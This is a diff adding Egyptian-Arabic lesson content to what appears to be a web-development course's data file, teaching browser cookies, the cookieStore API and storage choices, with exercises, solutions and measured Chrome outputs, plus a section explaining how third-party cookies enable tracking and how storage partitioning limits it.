+**[[document.cookie = "..."]] setter**، مش متغيّر: كل تعيين بيضيف أو بيعدّل كوكي واحدة، والباقي زي ما هو. [[theme=light]] عدّلت [[theme]] بس وسابت [[lang]].
+
+~~~text
+document.cookie = "lang=ar; max-age=3600; path=/; SameSite=Lax"
+                   ^^^^^^^  ^^^^^^^^^^^^  ^^^^^^^  ^^^^^^^^^^^^
+                   الاسم والقيمة  الخصايص: مش بتتقرا تاني، بتتحفظ مع الكوكي
+~~~
+
+| الخاصية | بتعمل إيه | من غيرها |
+|---|---|---|
+| [[max-age=ثواني]] | تموت بعد كام ثانية ([[31536000]] = سنة) | كوكي session: تموت مع قفل المتصفح |
+| [[expires=تاريخ]] | تموت في تاريخ بصيغة [[toUTCString()]]: [[Thu, 31 Dec 2026 00:00:00 GMT]] | نفس اللي فوق. لو الاتنين موجودين [[max-age]] يكسب |
+| [[path=/]] | بتتبعت وبتتشاف للعناوين اللي تحت المسار ده | المسار الحالي: كوكي اتعملت في [[/admin/x]] مش هتتشاف من [[/]] |
+| [[domain=example.com]] | بتشمل الـ subdomains | الدومين الحالي بس، من غير subdomains |
+| [[SameSite=Lax]] | متتبعتش مع طلبات من مواقع تانية، إلا لما اليوزر يدوس لينك | **Lax** في Chrome |
+| [[SameSite=Strict]] | متتبعتش من أي موقع تاني خالص | |
+| [[SameSite=None]] | بتتبعت من أي حتة، **ولازم معاها [[Secure]]** | |
+| [[Secure]] | HTTPS بس | بتتبعت على HTTP كمان |
+
+**اتقاس:**
+
+- [[only=admin; path=/admin]] اتحفظت بس مظهرتش في [[document.cookie]] على [[/]].
+- [[sec=1; Secure]] **اتحفظت على [[http://localhost]]**: Chrome بيعتبر [[localhost]] آمن ([[isSecureContext]] = [[true]]). على أي دومين [[http]] تاني كانت هتترفض.
+- [[cross=1; SameSite=None]] من غير [[Secure]]: **اترفضت** من غير أي رسالة.
+- [[big=]] ومعاها ٤٠٩٢ حرف (الاسم والقيمة = ٤٠٩٦) اتحفظت، و [[big5=]] ومعاها ٤٠٩٣ (= ٤٠٩٧) **اختفت** من غير error. الحد ٤٠٩٦ للاسم والقيمة مع بعض.
+
+**المسح:** مفيش [[deleteCookie]]. بتكتب نفس الاسم ونفس [[path]] (ونفس [[domain]] لو اتحط) بـ [[max-age=0]] أو [[expires]] في الماضي. لو الـ path مختلف، بتعمل كوكي تانية جديدة والقديمة باقية.
+
+---
+
+## ٣. القيمة: [[;]] و [[,]] والمسافات والعربي
+
+~~~text الناتج (Chrome 157)
+document.cookie = "note=قهوة; سكر"          → note=قهوة      (اللي بعد ; اتفهم خاصية واتجاهل)
+document.cookie = "note2=" + encodeURIComponent("قهوة; سكر") → note2=%D9%82%D9%87%D9%88%D8%A9%3B%20%D8%B3%D9%83%D8%B1
+~~~
+
+والعربي من غير encode: المتصفح خزّنه وعرضه صح في [[document.cookie]]، **بس السيرفر استلمه بايظ**:
+
+~~~text الناتج: /echo-cookie (سيرفر node:http) بعد document.cookie = "city=الجيزة"
+JS يشوف:      city=الجيزة
+السيرفر استلم: city=Ø§ÙØ¬ÙØ²Ø©
+~~~
+
+الـ headers في HTTP المفروض ASCII. Chrome بعت البايتس UTF-8، و Node قراها حرف لكل بايت (latin1)، فطلعت «Ø§Ù...». القاعدة: **[[encodeURIComponent]] وانت بتكتب، و [[decodeURIComponent]] وانت بتقرا**، في JS وفي السيرفر.
+
+---
+
+## ٤. [[HttpOnly]]: كوكي JS ميشوفهاش
+
+~~~text الناتج: بعد fetch("/set-httponly") اللي بيبعت Set-Cookie: sid=abc123; HttpOnly و theme=dark
+JS يشوف:      lang=ar; city=...; theme=dark
+السيرفر استلم: lang=ar; city=...; sid=abc123; theme=dark
+~~~
+
+- **[[sid]] مش في [[document.cookie]]** بس المتصفح بيبعتها في كل طلب. ده المطلوب لكوكي اللوجين: لو حصل XSS، السكربت الخبيث مش هيقدر يقراها ويبعتها لحد.
+- **JS ميقدرش يعمل كوكي [[HttpOnly]]:** [[document.cookie = "sid=hack; HttpOnly"]] اتجاهلت كلها (سطر ٦ في المثال). [[HttpOnly]] من السيرفر بس.
+- **JS ميقدرش يمسحها ولا يكتب فوقها** بنفس الاسم.
+- وكوكي السيرفر من غير [[HttpOnly]] ([[theme=dark]] هنا) JS بيشوفها ويعدّلها عادي. ده قصد: كوكي الثيم السيرفر يحطها والصفحة تغيّرها.
+
+تقرا الخصايص كلها في DevTools: Application ثم Cookies (درس «Cookies» بتاب الـ web)، و [[SameSite]] والـ CSRF بالتفصيل في درس «CSRF و SameSite».
+
+---
+
+## ٥. [[cookieStore]]: الـ API الجديد
+
+[[document.cookie]] من التسعينات: نص، و sync، ومفيش events. [[cookieStore]] (Cookie Store API) بقى Baseline 2025، وموجود في Chrome 157:
+
+~~~js cookie-store.js (module)
+await cookieStore.set({ name: "theme", value: "dark", expires: Date.now() + 7 * 86400000 });
+const t = await cookieStore.get("theme");
+console.log(t.name, t.value, t.path, t.sameSite);
+const all = await cookieStore.getAll();
+console.log(all.map(c => c.name).join(","));
+cookieStore.addEventListener("change", e => console.log(e.changed.map(c => c.name), e.deleted.map(c => c.name)));
+await cookieStore.delete("theme");
+~~~
+
+~~~text الناتج (Chrome 157)
+theme dark / strict
+theme
+[] [theme]
+~~~
+
+- **[[get]] بيرجّع object** فيه [[name]] و [[value]] و [[path]] و [[sameSite]] و [[expires]] و [[secure]] و [[domain]]: حاجات [[document.cookie]] مبيقولهاش.
+- **[[sameSite]] الافتراضي في [[cookieStore.set]] = [["strict"]]**، مش Lax زي [[document.cookie]]. لو الكوكي محتاجة تتبعت لما حد ييجي من لينك برّه، حط [[sameSite: "lax"]] بنفسك.
+- **حدث [[change]]** بيوصل لما الكوكي تتغيّر حتى بـ [[document.cookie]] (تمرين ٥).
+- **[[cookieStore.set("bad;name", "x")]]** بترمي [[TypeError: Failed to execute 'set' on 'CookieStore': Cookie was malformed and could not be stored, due to problem(s) while parsing.]] بدل ما تبوّظ بصمت.
+- **محتاج secure context** (HTTPS أو localhost)، ومش بيشوف [[HttpOnly]] برضه. ولو لازم تدعم متصفحات قديمة: [[if ("cookieStore" in window)]] وإلا [[document.cookie]].
+
+---
+
+## الخلاصة
+
+| عايز | اكتب |
+|---|---|
+| تقرا كوكي | [[getCookie(name)]] (split و indexOf و decode)، أو [[await cookieStore.get(name)]] |
+| تكتب لسنة | [[document.cookie = name + "=" + encodeURIComponent(v) + "; max-age=31536000; path=/; SameSite=Lax"]] |
+| تمسح | نفس الاسم والـ path و [[max-age=0]] |
+| كوكي JS ميلمسهاش | [[HttpOnly]] من السيرفر بس |
+| تعرف إنها اتغيّرت | [[cookieStore.addEventListener("change", ...)]] |
+
+اللي ميتلخبطش: التعيين بيضيف كوكي واحدة، والقراية من غير خصايص، والقيمة encode، و [[SameSite=None]] من غير [[Secure]] بتترفض، والحد ٤٠٩٦ حرف وبتختفي من غير error، والكوكي بتتبعت مع كل طلب فخليها صغيرة.`,
+          lines: [
+            R`كوكي session (من غير [[max-age]]): تموت مع قفل المتصفح`,
+            R`كوكي لساعة، لكل الموقع، ومتتبعتش من مواقع تانية إلا من لينك`,
+            R`بيطبع [[theme=dark; lang=ar]]: الأسامي والقيم بس من غير الخصايص`,
+            R`نفس الاسم: بيعدّل [[theme]] بس، و [[lang]] زي ما هي`,
+            R`[[encodeURIComponent]] بيحوّل العربي والـ [[;]] والمسافة لـ [[%XX]] عشان القيمة متتقطعش`,
+            R`[[HttpOnly]] من JS: المتصفح بيتجاهل السطر كله ومبيعملش الكوكي`,
+            R`[[lang]] و [[theme]] و [[city]] بس، من غير [[sid]]`,
+            R`مفيش دالة مسح: بنكتب نفس الاسم بقيمة فاضية و [[max-age=0]] فالمتصفح يشيلها`,
+            R`فاضل [[lang]] و [[city]] بس، لأن [[theme]] اتمسحت و [[sid]] عمرها ما اتعملت`,
+          ],
+          practice: [
+            { lvl: 'تطبيق', t: R`**ابني:** [[getCookie(name)]] بترجّع القيمة بعد [[decodeURIComponent]] أو [[null]]، ومبتلخبطش بين [[lang]] و [[xlang]]. اختبرها بـ [[lang=ar]] و [[xlang=en]] وقيمة فيها [[;]] وعربي، واسأل السيرفر ([[/echo-cookie]]) هو استلم إيه (من قسمي ١ و ٣ في الشرح).`, done: R`[[getCookie("lang")]] = [["ar"]] حتى و [[xlang]] موجودة، و [[getCookie("la")]] = [[null]]، والقيمة العربي رجعت زي ما هي، والسيرفر استلم القيمة encoded.`, sol: R`~~~js cookies.js (صفحة من سيرفر محلي، module)
+function getCookie(name) {
+  for (const part of document.cookie.split("; ")) {
+    const i = part.indexOf("=");
+    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
+  }
+  return null;
+}
+console.log(JSON.stringify(getCookie("lang")));
+document.cookie = "lang=ar; path=/";
+document.cookie = "city=" + encodeURIComponent("الجيزة; وسط البلد") + "; path=/";
+document.cookie = "xlang=en; path=/";
+console.log(getCookie("lang"), "|", getCookie("city"), "|", getCookie("la"), "|", getCookie("xlang"));
+console.log("server:", await (await fetch("/echo-cookie")).text());
+~~~
+
+~~~text الناتج (Chrome 157، كوكيز فاضية في الأول)
+null
+ar | الجيزة; وسط البلد | null | en
+server: lang=ar; city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; xlang=en
+~~~
+
+- **[[part.slice(0, i) === name]]** مقارنة كاملة. [[part.startsWith(name + "=")]] كمان صح، بس [[startsWith(name)]] لوحدها كانت هترجّع [[xlang]] لو اتطلب [[x]].
+- **[[document.cookie]] الفاضي** = [[""]]، و [[split("; ")]] بيرجّع [[[""]]]، و [[indexOf]] = [[-1]]، فالمقارنة [[false]] والدالة بترجّع [[null]] من غير ما تقع.
+- **السيرفر** محتاج [[decodeURIComponent]] هو كمان. Express بـ [[cookie-parser]] بيعملها لوحده.` },
+            { lvl: 'تطبيق', t: R`**ابني:** [[setCookie(name, value, { days = 365, path = "/", sameSite = "Lax", secure })]] بترجّع النص اللي اتكتب، و [[secure]] افتراضي [[true]] على https بس، و [[deleteCookie(name, path)]]. جرّبها واطبع [[document.cookie]] بعد المسح (من قسم ٢ في الشرح).`, done: R`النص المطبوع فيه [[max-age=31536000]] و [[path=/]] و [[SameSite=Lax]]، والقيمة العربي encoded، وبعد [[deleteCookie("lang")]] الكوكي مش موجودة.`, sol: R`~~~js set-cookie.js (صفحة من سيرفر محلي)
+function setCookie(name, value, { days = 365, path = "/", sameSite = "Lax", secure = location.protocol === "https:" } = {}) {
+  let c = encodeURIComponent(name) + "=" + encodeURIComponent(value) + "; max-age=" + Math.round(days * 86400) + "; path=" + path + "; SameSite=" + sameSite;
+  if (secure) c += "; Secure";
+  document.cookie = c;
+  return c;
+}
+const deleteCookie = (name, path = "/") => { document.cookie = encodeURIComponent(name) + "=; max-age=0; path=" + path; };
+
+console.log(setCookie("lang", "ar"));
+console.log(setCookie("city", "الجيزة; وسط البلد", { days: 7 }));
+deleteCookie("lang");
+console.log(document.cookie);
+~~~
+
+~~~text الناتج (Chrome 157، http://localhost)
+lang=ar; max-age=31536000; path=/; SameSite=Lax
+city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF; max-age=604800; path=/; SameSite=Lax
+city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9%3B%20%D9%88%D8%B3%D8%B7%20%D8%A7%D9%84%D8%A8%D9%84%D8%AF
+~~~
+
+- **[[= {}]] في الآخر** بيخلي الـ options اختيارية كلها: [[setCookie("lang", "ar")]] من غير object.
+- **[[secure]] من البروتوكول:** على [[http://localhost]] مش هيتحط، وعلى الموقع الحقيقي (https) هيتحط لوحده.
+- **[[deleteCookie]] بنفس الـ path:** لو الكوكي اتعملت بـ [[path=/admin]] لازم تمسحها بـ [[deleteCookie(name, "/admin")]].
+- **[[max-age]] مش [[expires]]:** أبسط (ثواني) ومش محتاج تحسب تاريخ، وكل المتصفحات الحالية بتدعمه.` },
+            { lvl: 'سريع', t: R`**اقرا وتوقّع:** صفحة كوكيزها فاضية. بالترتيب: [[document.cookie = "theme=dark"]]، و [[= "theme=light"]]، و [[= "note=قهوة; سكر"]]، و [[= "sid=hack; HttpOnly"]]، و [[= "only=admin; path=/admin"]]، و [[= "cross=1; SameSite=None"]]. إيه اللي [[document.cookie]] هيطبعه على [[http://localhost/]]؟ (من قسمي ٢ و ٤ في الشرح).`, done: R`كتبت [[theme=light; note=قهوة]] بس، وعارف ليه كل واحدة من الأربعة التانيين مش موجودة.`, sol: R`~~~js الـ Console (http://localhost:8765/، الكوكيز اتمسحت الأول)
+document.cookie = "theme=dark";
+document.cookie = "theme=light";
+document.cookie = "note=قهوة; سكر";
+document.cookie = "sid=hack; HttpOnly";
+document.cookie = "only=admin; path=/admin";
+document.cookie = "cross=1; SameSite=None";
+console.log(document.cookie);
+~~~
+
+~~~text الناتج (Chrome 157)
+theme=light; note=قهوة
+~~~
+
+- **[[theme]]:** نفس الاسم = تعديل.
+- **[[note]]:** «سكر» بعد [[;]] اتفهمت خاصية مش معروفة واتجاهلت.
+- **[[sid]]:** [[HttpOnly]] من JS = الكوكي كلها اترفضت.
+- **[[only]]:** اتحفظت، بس الـ path [[/admin]] فمش بتتشاف من [[/]].
+- **[[cross]]:** [[SameSite=None]] من غير [[Secure]] = اترفضت.` },
+            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** صفحة بتحفظ المدينة بـ [[document.cookie = "city=" + city]]، والسيرفر بيرحّب «أهلًا يا جاي من الجيزة» من الكوكي. لما اليوزر كتب «الجيزة» السيرفر كتب حاجة غريبة. استخدم [[/echo-cookie]] (أو [[console.log(req.headers.cookie)]] في سيرفرك) عشان تشوف اللي وصل، وصلّح الطرفين (من قسم ٣ في الشرح).`, done: R`شفت «Ø§ÙØ¬ÙØ²Ø©» في السيرفر، وبعد الإصلاح السيرفر بيطبع «الجيزة».`, sol: R`~~~js الصفحة: قبل وبعد
+document.cookie = "city=الجيزة; path=/";
+console.log("JS:", document.cookie);
+console.log("server:", await (await fetch("/echo-cookie")).text());
+document.cookie = "city=" + encodeURIComponent("الجيزة") + "; path=/";
+console.log("server بعد:", await (await fetch("/echo-cookie")).text());
+~~~
+
+~~~js server.js (الجزء اللي بيقرا الكوكي)
+function readCookie(req, name) {
+  for (const part of (req.headers.cookie || "").split("; ")) {
+    const i = part.indexOf("=");
+    if (part.slice(0, i) === name) return decodeURIComponent(part.slice(i + 1));
+  }
+  return null;
+}
+~~~
+
+~~~text الناتج (Chrome 157 والسيرفر node:http على Node 24.22)
+JS: city=الجيزة
+server: city=Ø§ÙØ¬ÙØ²Ø©
+server بعد: city=%D8%A7%D9%84%D8%AC%D9%8A%D8%B2%D8%A9
+readCookie(req, "city") بعد: الجيزة
+~~~
+
+(السطر الأخير من [[readCookie]] في Node 24.22 على نفس الـ header اللي السيرفر استلمه.)
+
+- **ليه JS شايفها صح والسيرفر لأ:** المتصفح بيخزّن النص زي ما هو، ولما بيبعته في الـ header بيبعته بايتس UTF-8. الـ headers في HTTP المفروض ASCII، و Node بيقرا أي بايت فوق ١٢٧ كحرف latin1 لوحده، فالحرف العربي (بايتين) بقى حرفين غريبين.
+- **[[encodeURIComponent]]** بيخلي القيمة ASCII بس ([[%D8%A7...]])، فبتعدّي سليمة في أي سيرفر.
+- **غلطة تانية في الكود الأصلي:** من غير [[path=/]] الكوكي بتاخد مسار الصفحة الحالية، فلو اتعملت من [[/settings/city]] مش هتتبعت مع [[/]].` },
+            { lvl: 'تطبيق', t: R`**ابني:** بـ [[cookieStore]]: اسمع على [[change]] واطبع كل اسم اتغيّر أو اتمسح، وبعدين [[set]] كوكي [[theme]] لأسبوع، و [[get]] واطبع كل خصايصها، وغيّرها بـ [[document.cookie]] القديمة، وامسحها بـ [[delete]]. الحدث وصل كام مرة؟ وإيه الـ [[sameSite]] الافتراضي؟ (من قسم ٥ في الشرح).`, done: R`الحدث وصل ٣ مرات (dark ثم light ثم deleted) حتى للتغيير اللي بـ [[document.cookie]]، و [[sameSite]] طلع [["strict"]].`, sol: R`~~~js cookie-store.js (صفحة من سيرفر محلي، module)
+const seen = [];
+cookieStore.addEventListener("change", e => {
+  for (const c of e.changed) seen.push("changed " + c.name + "=" + c.value);
+  for (const c of e.deleted) seen.push("deleted " + c.name);
+});
+await cookieStore.set({ name: "theme", value: "dark", expires: Date.now() + 7 * 86400000 });
+const t = await cookieStore.get("theme");
+console.log("get:", t.name, t.value, t.path, t.sameSite);
+document.cookie = "theme=light; path=/";
+await cookieStore.delete("theme");
+await new Promise(r => setTimeout(r, 200));
+console.log("events:", seen.join(" | "));
+~~~
+
+~~~text الناتج (Chrome 157)
+get: theme dark / strict
+events: changed theme=dark | changed theme=light | deleted theme
+~~~
+
+- **الحدث بيوصل لأي تغيير** من الصفحة دي أو من تاب تاني أو من السيرفر ([[Set-Cookie]])، مش بس من [[cookieStore]]. ده اللي [[document.cookie]] مكانش بيقدر عليه غير بـ [[setInterval]] يفحص كل ثانية.
+- **[[setTimeout]] ٢٠٠ في الآخر:** الأحداث async، فاستنينا شوية قبل ما نطبع.
+- **[[sameSite: "strict"]] افتراضي:** أأمن، بس لو اليوزر جه من لينك في إيميل، الكوكي مش هتتبعت مع أول طلب. الثيم مش مشكلة، اللوجين مشكلة.
+- **[[expires]] بالـ ms** ([[Date.now() + ...]]) مش بالثواني زي [[max-age]].` },
+          ],
+          ref: [
+            { t: "MDN: Document.cookie", url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie" },
+            { t: "MDN: Using HTTP cookies", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies" },
+            { t: "MDN: Set-Cookie", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie" },
+            { t: "MDN: Cookie Store API", url: "https://developer.mozilla.org/en-US/docs/Web/API/Cookie_Store_API" },
+            { t: "MDN: CookieStore", url: "https://developer.mozilla.org/en-US/docs/Web/API/CookieStore" },
+          ],
+          pre: [{ to: "web/Cookies", why: R`تشوف الكوكيز بخصايصها في Application، و [[HttpOnly]] و [[Secure]]` }, { to: "web/CSRF و SameSite", why: R`ليه [[SameSite]] موجود والهجوم اللي بيمنعه` }, { to: "js/مشروع — CORS والكوكيز", why: R`الكوكيز مع [[fetch]] لسيرفر على دومين تاني و [[credentials]]` }],
+          deep: {
+            why: R`الكوكي هي الطريقة الوحيدة اللي السيرفر يعرف بيها حاجة عن اليوزر من أول طلب (قبل أي JS): اللوجين، واللغة، والثيم. وكتير من مواقع الشغل فيها كوكيز JS لازم يقراها أو يكتبها (consent banner، تفضيلات)، والـ API غريب بما يكفي إنه يعمل باجات.`,
+            how: R`المتصفح عنده «cookie jar» لكل البروفايل. [[Set-Cookie]] أو [[document.cookie =]] بيضيفوا كوكي متعرّفة بالتلاتة: الاسم والدومين والـ path. مع كل طلب المتصفح بيختار الكوكيز اللي الدومين والـ path والـ [[SameSite]] والـ [[Secure]] بتاعتهم ماشيين مع الطلب، ويحطهم في [[Cookie]]. و [[document.cookie]] بيرجّع نفس الاختيار ده من غير اللي عليه [[HttpOnly]].`,
+            when: R`كوكي من السيرفر بـ [[HttpOnly; Secure; SameSite=Lax]] للـ session دايمًا. كوكي من JS لتفضيلات صغيرة السيرفر محتاجها قبل ما يرسم الصفحة (الثيم، اللغة). [[localStorage]] لتفضيلات السيرفر مش محتاجها، عشان متتقلش كل طلب. [[cookieStore]] لو محتاج تعرف إن الكوكي اتغيّرت.`,
+            mistakes: R`قيمة فيها [[;]] أو عربي من غير encode. مسح بـ path مختلف. [[startsWith]] في القراية. نسيان [[path=/]]. [[SameSite=None]] من غير [[Secure]]. توكن في كوكي JS بيكتبها. كوكيز كبيرة بتتبعت مع كل صورة. توقّع إن [[cookieStore.set]] Lax زي [[document.cookie]].`,
+          },
+        },
+        {
+          cmd: "تختار تخزين إيه: cookies و Storage و Cache و IndexedDB",
+          title: "٤ أماكن تحفظ فيها في المتصفح: مين لإيه، وإزاي المواقع بتستخدمها تتبعك",
+          desc: R`المتصفح فيه ٤ أماكن تخزين لكل موقع: **الكوكيز** (صغيرة وبتتبعت للسيرفر)، و **Web Storage** ([[localStorage]] و [[sessionStorage]]: نصوص صغيرة sync)، و **Cache API** ([[caches]]: طلبات وردود كاملة، للأوفلاين)، و **IndexedDB** (قاعدة بيانات async كبيرة لأي object وملفات). الدرس ده بيقارنهم بالأرقام، وبيقولك تختار مين لكل حالة (الحالة بعد الـ reload، اللوجين، التفضيلات، الشغل أوفلاين)، وبيوريك الجانب الوحش: إزاي الكوكيز والتخزين والـ fingerprinting بيتستخدموا عشان يتتبعوك، وإزاي المتصفحات بتقفل ده بالـ partitioning.
+• المقاس كله: [[navigator.storage.estimate()]] و [[navigator.storage.persist()]].`,
+          example: R`const before = (await navigator.storage.estimate()).usage;
+const cache = await caches.open("lab-v1");
+await cache.put("/big", new Response(new Uint8Array(1024 * 1024)));
+const { usage, quota, usageDetails } = await navigator.storage.estimate();
+console.log(before, usage, usageDetails, (quota / 1024 ** 3).toFixed(1) + " GB");
+console.log(await navigator.storage.persisted(), await caches.keys());
+await caches.delete("lab-v1");`,
+          try: R`افتح DevTools في أي موقع بتستخدمه كتير، وروح Application ثم Storage: الـ «Usage» كام؟ وفي Cookies كام كوكي؟ وبعدين افتح Application ثم Cookies واختار كوكي ليها Domain مش بتاع الموقع ده: دي third-party.`,
+          sol: R`مفيش ناتج واحد صح هنا: الأرقام بتختلف من موقع لموقع. اللي اتقاس على صفحة تجربة من سيرفر محلي (Chrome 157، origin فاضي):
+
+~~~text الناتج: المثال
+0 1048666 {caches: 1048666} 10.0 GB
+false [lab-v1]
+~~~
+
+- **[[usage]]** زاد ميجا واحدة بالظبط تقريبًا (١٠٤٨٦٦٦ = ١٠٤٨٥٧٦ بايت داتا و ٩٠ زيادة للرد نفسه).
+- **[[quota]]** حوالي ١٠ جيجا: Chrome بيدي كل origin نسبة من مساحة الديسك الفاضية، فالرقم ده بيختلف من جهاز لجهاز.
+- **[[persisted()]] = [[false]]:** المتصفح ممكن يمسح التخزين ده لو الديسك اتملا (قسم ٤).`,
+          teach: R`## الفكرة
+
+كل مكان اتعمل لمشكلة معينة، واستخدامه في غيرها بيعمل مشاكل. الجدول ده هو الدرس:
+
+| | الكوكيز | [[localStorage]] | [[sessionStorage]] | Cache API | IndexedDB |
+|---|---|---|---|---|---|
+| بيخزّن | نص | نص | نص | [[Request]] و [[Response]] كاملين | أي object، و [[Blob]] و [[File]] و [[Date]] و [[Map]] |
+| المقاس | ٤٠٩٦ حرف للكوكي | حوالي ٥ مليون حرف | حوالي ٥ مليون حرف | من الـ quota الكبيرة (جيجات) | من الـ quota الكبيرة |
+| sync؟ | sync ([[cookieStore]] async) | **sync** (بيوقف الصفحة) | **sync** | async (Promise) | async |
+| بيتبعت مع الطلبات | **آه، كل طلب** | لأ | لأ | لأ | لأ |
+| من service worker أو web worker | لأ (إلا [[cookieStore]] في الـ SW) | لأ | لأ | آه | آه |
+| بيعيش لحد | [[max-age]] أو قفل المتصفح | ما يتمسح | قفل التاب | ما يتمسح | ما يتمسح |
+| السيرفر يكتبه | آه ([[Set-Cookie]]) | لأ | لأ | لأ | لأ |
+| JS ميشوفهوش | [[HttpOnly]] | مستحيل | مستحيل | مستحيل | مستحيل |
+
+النواتج من Chrome 157 على origin فاضي من سيرفر محلي.
+
+---
+
+## ١. اختار حسب السؤال
+
+| الحالة | المكان | ليه |
+|---|---|---|
+| اللوجين (session) | كوكي [[HttpOnly; Secure; SameSite=Lax]] من السيرفر | بتتبعت لوحدها، و JS (و XSS) مبيشوفهاش |
+| الثيم أو اللغة والسيرفر بيرسم الصفحة | كوكي صغيرة | السيرفر يحط [[data-theme]] قبل ما الصفحة توصل، فمفيش وميض (مشروع الملاحظات) |
+| الثيم في صفحة static | [[localStorage]] | مش محتاج يسافر مع كل طلب |
+| مسودة فورم | [[localStorage]] (أو [[sessionStorage]] لو للتاب ده بس) | صغيرة، ولازم تعيش مع الـ reload |
+| خطوة في wizard، فلتر في التاب ده | [[sessionStorage]] | تاب تاني يبدأ من الأول |
+| الصفحات والـ CSS والصور للأوفلاين | Cache API من service worker | مصممة للطلب والرد (وحدة «PWA و service worker») |
+| رسايل، منتجات، صور اليوزر، آلاف السجلات | IndexedDB | كبيرة، async، بـ indexes، ومن worker |
+| حاجة سرية | **ولا واحد** | أي حاجة في المتصفح على جهاز اليوزر |
+
+**غلطات المقاس:** ٥٠٠٠ منتج في [[localStorage]] = [[JSON.parse]] لميجات كل ما الصفحة تفتح، والصفحة واقفة لحد ما يخلص. وتوكن ٢ كيلو في كوكي = ٢ كيلو زيادة مع كل صورة وكل طلب.
+
+---
+
+## ٢. الأماكن الكبيرة: Cache API و IndexedDB
+
+~~~text الناتج: ميجا في Cache وميجا في IndexedDB
+قبل: 0.00 MB | بعد Cache: 1.00 MB | بعد IndexedDB: 2.00 MB
+details: {"caches":1049088,"indexedDB":1052336}
+quota: 10.0 GB
+persist(): false
+~~~
+
+**Cache API** خزنة طلبات: [[caches.open(name)]] و [[cache.put(request, response)]] و [[cache.add(url)]] (بيعمل fetch ويخزّن) و [[caches.match(url)]]. اتعمل للـ service worker بس شغال من الصفحة كمان (تمرين ٤):
+
+~~~text الناتج: cache.add("/hello.txt") وبعدين النت اتقطع
+fetch: TypeError: Failed to fetch
+cache: "أهلًا من ملف نص\nسطر تاني\n"
+miss: undefined
+~~~
+
+**IndexedDB** قاعدة بيانات: object stores (زي الجداول) و indexes و transactions، وبتخزّن أي حاجة [[structuredClone]] يقدر ينسخها (حتى [[Blob]]). الـ API نفسه بالأحداث (قديم وتقيل)، فالناس بتستخدم مكتبة صغيرة زي [[idb]]. شرحها كامل في درس «IndexedDB و BroadcastChannel».
+
+**[[navigator.storage]]:** [[estimate()]] بيقولك مستخدم كام ومسموح كام، و [[usageDetails]] (Chrome) مقسّم على الأنواع. Cache و IndexedDB والـ service workers بيتحسبوا من نفس الـ quota. Web Storage والكوكيز ليهم حدودهم الصغيرة لوحدهم.
+
+---
+
+## ٣. المسح: مين بيمسح إيه
+
+- **اليوزر:** «Clear browsing data»، أو Application ثم Clear site data (درس «Clear site data»)، أو الوضع الخفي (كله بيتمسح مع القفل).
+- **المتصفح لوحده (eviction):** لو الديسك قرّب يتملا، المتصفح بيمسح تخزين المواقع الأقل استخدامًا (Cache و IndexedDB و Web Storage مع بعض للـ origin كله). [[await navigator.storage.persist()]] بيطلب استثناء: Chrome بيوافق لوحده للمواقع اللي اليوزر بيستخدمها كتير أو متسطبة (PWA)، وإلا بيرجّع [[false]] زي ما حصل هنا.
+- **Safari:** بيمسح تخزين الـ script (Web Storage و IndexedDB و Cache) لموقع اليوزر مفتحهوش ٧ أيام (ده من وثايق WebKit، متجرّبش هنا).
+- **السيرفر:** header [[Clear-Site-Data: "cache", "cookies", "storage"]] في رد تسجيل الخروج.
+
+**النتيجة:** أي حاجة في المتصفح **كاش**، مش المصدر الوحيد. الداتا المهمة مكانها السيرفر، والمتصفح نسخة للسرعة والأوفلاين.
+
+---
+
+## ٤. الجانب الوحش: التتبع
+
+نفس الأدوات دي بتستخدمها شركات الإعلانات عشان تعرف إنك نفس الشخص في مواقع مختلفة.
+
+**أ. الكوكيز الـ third-party:** موقع أخبار فيه [[<script src="https://ads.example/pixel.js">]] أو [[<iframe>]] من نفس شركة الإعلانات. طلب الصورة أو السكربت ده بيروح لـ [[ads.example]] ومعاه **كوكي [[ads.example]]** (third-party: دومين غير الموقع اللي انت فاتحه). نفس الكوكي بتتبعت من موقع الأخبار ومن موقع الماتشات ومن متجر الأحذية، فالشركة بتربط زياراتك كلها بـ id واحد. وده سبب إن [[SameSite=None]] لازم معاه [[Secure]]، وإن [[Lax]] بقى الافتراضي.
+
+**ب. التخزين في iframe:** نفس الفكرة بـ [[localStorage]] جوه iframe من [[ads.example]]. جرّبناها: صفحة على [[127.0.0.1]] حطت [[who=first-party]]، وبعدين صفحة على [[localhost]] (موقع تاني) فيها iframe من [[127.0.0.1]] بيقرا نفس المفتاح:
+
+~~~text الناتج: iframe من 127.0.0.1 جوه صفحة localhost
+Chromium اللي Playwright بيشغّله: peek in iframe → who = "first-party" | cookie = ""
+Chrome 157 العادي:               peek in iframe → who = null | cookie = ""
+~~~
+
+- **في Chrome العادي الـ iframe شاف [[null]]:** ده **storage partitioning**. التخزين جوه الـ iframe متقسّم بالموقع اللي فوق: [[127.0.0.1]] جوه [[localhost]] ليه درج غير [[127.0.0.1]] لوحده. فشركة الإعلانات بقت شايفة درج مختلف في كل موقع، ومتقدرش تربطهم. Firefox و Safari بيعملوا نفس الحكاية.
+- **نسخة Chromium بتاعة Playwright شافت القيمة:** نفس رقم الإصدار، بس Playwright بيشغّل Chromium بـ flags خاصة بتقفل features، والأرجح إن الـ partitioning منهم (ده تفسيرنا، اتقاس الفرق بس). الدرس: الاختبار الآلي ممكن ميطابقش متصفح اليوزر، فالحاجات الخاصة بالخصوصية اتأكد منها في متصفح عادي.
+- **الكوكي [[""]] في الحالتين:** الكوكي اتعملت من غير [[SameSite]]، فالافتراضي Lax، و Lax مبتتبعتش لـ iframe من موقع تاني.
+- **الكوكيز الـ third-party نفسها:** Safari و Firefox بيقفلوها أو بيقسّموها افتراضي. Chrome لسه بيسمح بيها افتراضي واليوزر يقدر يقفلها من الإعدادات. والموقع اللي محتاج كوكي جوه iframe بشكل شرعي (شات دعم مثلًا) بيحط [[Partitioned]] (CHIPS) فتبقى درج منفصل لكل موقع فوق.
+
